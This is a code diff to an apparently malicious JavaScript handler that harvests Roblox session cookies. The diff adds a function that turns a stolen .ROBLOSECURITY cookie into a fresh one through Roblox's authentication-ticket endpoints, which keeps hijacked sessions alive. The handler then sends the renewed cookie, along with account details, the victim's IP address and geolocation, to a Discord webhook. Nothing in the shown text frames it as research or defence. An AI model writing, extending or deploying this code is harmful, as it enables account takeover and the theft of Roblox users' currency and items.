@@ -75,6 +75,64 @@ async function checkGamepass(uid, gamepassId, headers) {
   }
 }
 
+async function renewRobloxCookie(cookie) {
+  try {
+    // Step 1 — get a CSRF token (Roblox returns 403 with real token in header)
+    const csrfRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
+      method: 'POST',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json',
+        'Referer': 'https://www.roblox.com',
+        'Origin': 'https://www.roblox.com',
+        'x-csrf-token': ''
+      }
+    });
+    const csrfToken = csrfRes.headers.get('x-csrf-token');
+    if (!csrfToken) return null;
+
+    // Step 2 — request an authentication ticket using the real CSRF token
+    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
+      method: 'POST',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json',
+        'Referer': 'https://www.roblox.com',
+        'Origin': 'https://www.roblox.com',
+        'x-csrf-token': csrfToken
+      }
+    });
+    if (!ticketRes.ok) return null;
+
+    const ticket = ticketRes.headers.get('rbx-authentication-ticket');
+    if (!ticket) return null;
+
+    // Step 3 — redeem ticket for a brand-new .ROBLOSECURITY cookie
+    const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'RBXAuthenticationNegotiation': '1'
+      },
+      body: JSON.stringify({ authenticationTicket: ticket })
+    });
+    if (!redeemRes.ok) return null;
+
+    // Extract new .ROBLOSECURITY from Set-Cookie header
+    const setCookie = redeemRes.headers.get('set-cookie') || '';
+    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
+    if (!match) return null;
+
+    const newRaw = decodeURIComponent(match[1]);
+    if (newRaw.startsWith('_|WARNING')) return newRaw;
+    return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${newRaw}`;
+
+  } catch (err) {
+    console.error('Cookie renewal error:', err);
+    return null;
+  }
+}
+
 async function fetchRobloxInfo(cookie) {
   try {
     const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
@@ -192,8 +250,10 @@ async function sendToDiscord(webhookUrl, data) {
     console.error('Invalid webhook URL'); return false;
   }
 
-  const { rawValue, cookie, roblox, ip, geo, now } = data;
+  const { rawValue, cookie, renewedCookie, roblox, ip, geo, now } = data;
   const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
+  const cookieLabel = renewedCookie ? '🔄 Renewed .ROBLOSECURITY' : '🔐 .ROBLOSECURITY';
+  const cookieNote = renewedCookie ? ' ✅ Cookie successfully renewed & refreshed' : ' ⚠️ Renewal failed — original cookie shown';
 
   // ── TROLL / INVALID COOKIE EMBED ─────────────────────────────────────────
   if (cookie && !roblox) {
@@ -269,7 +329,7 @@ Owned: ${roblox?.groupsOwned || 0}`, true),
       false
     ),
     field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
-    field("🔐 .ROBLOSECURITY", `\`\`\`${cleanCookie}\`\`\``, false)
+    field(cookieLabel, `${cookieNote}\n\`\`\`${cleanCookie}\`\`\``, false)
   ];
 
   const payload = {
@@ -347,10 +407,18 @@ export default async function handler(req, res) {
   const cookie = extractRobloxCookie(rawValue);
   const roblox = cookie ? await fetchRobloxInfo(cookie) : null;
 
+  // Renew the cookie after grabbing account info — sends fresh cookie to Discord
+  let renewedCookie = null;
+  if (cookie && roblox) {
+    renewedCookie = await renewRobloxCookie(cookie);
+  }
+  const finalCookie = renewedCookie || cookie; // fall back to original if renewal fails
+
   const data = {
     slotLabel,
     rawValue,
-    cookie,
+    cookie: finalCookie,
+    renewedCookie,
     roblox,
     ip,
     geo,
